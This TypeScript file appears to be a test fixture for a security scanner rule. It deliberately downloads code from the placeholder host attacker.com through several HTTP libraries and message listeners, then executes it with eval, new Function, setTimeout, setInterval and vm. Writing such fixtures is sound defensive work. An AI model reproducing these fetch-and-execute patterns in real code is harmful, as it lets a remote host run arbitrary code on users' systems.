// Mock dependencies to avoid TS errors
import axios from 'axios';
import fetch from 'node-fetch';
import * as http from 'http';
import * as https from 'https';
import got from 'got';
import superagent from 'superagent';
import * as vm from 'vm';

async function triggerRule() {

    // FROM : 
    // fetch / axios / http / https / got / superagent / 
    // "message" event listener / "data" event listener
    // 
    // TO : 
    // eval / new Function() / setTimeout / setInterval /
    //  new vm.Script() / vm.runInNewContext

    const f1 = await axios.get('http://attacker.com/code');
    eval(f1.data);
    new Function(await f1.text())();
    setTimeout(await f1.text(), 1000);
    setInterval(await f1.text(), 1000);
    vm.runInNewContext(await f1.text());
    new vm.Script(await f1.text());

    const f2 = fetch('http://attacker.com/code');
    eval(f2.data);
    new Function(await f2.text())();
    setTimeout(await f2.text(), 1000);
    setInterval(await f2.text(), 1000);
    vm.runInNewContext(await f2.text());
    new vm.Script(await f2.text());

    https.get('https://attacker.com/code', (res) => {
        let body = '';
        res.on('data', (chunk) => { body += chunk; });
        res.on('end', () => {
            eval(body);
            new Function(body)();
            setTimeout(body, 1000);
            setInterval(body, 1000);
            vm.runInNewContext(body);
            new vm.Script(body);
        });
    });

    http.get('https://attacker.com/code', (res) => {
        let body = '';
        res.on('data', (chunk) => { body += chunk; });
        res.on('end', () => {
            eval(body);
            new Function(body)();
            setTimeout(body, 1000);
            setInterval(body, 1000);
            vm.runInNewContext(body);
            new vm.Script(body);
        });
    });

    const f3 = await got('http://attacker.com/code');
    eval(f3.data);
    new Function(await f3.text())();
    setTimeout(await f3.text(), 1000);
    setInterval(await f3.text(), 1000);
    vm.runInNewContext(await f3.text());
    new vm.Script(await f3.text());

    superagent.get('http://attacker.com/code').then((res: any) => {
        const body = res.body
        eval(body);
        new Function(body)();
        setTimeout(body, 1000);
        setInterval(body, 1000);
        vm.runInNewContext(body);
        new vm.Script(body);
    });

    if (typeof window !== 'undefined') {
        window.addEventListener('message', (event: any) => {
            const data = event.data;
            eval(data);
            new Function(data)();
            setTimeout(data, 1000);
            setInterval(data, 1000);
            vm.runInNewContext(data);
            new vm.Script(data);
        });
    }

    process.on('data' as any, (chunk: any) => {
        eval(chunk);
        new Function(chunk)();
        setTimeout(chunk, 1000);
        setInterval(chunk, 1000);
        vm.runInNewContext(chunk);
        new vm.Script(chunk);
    });
}

triggerRule();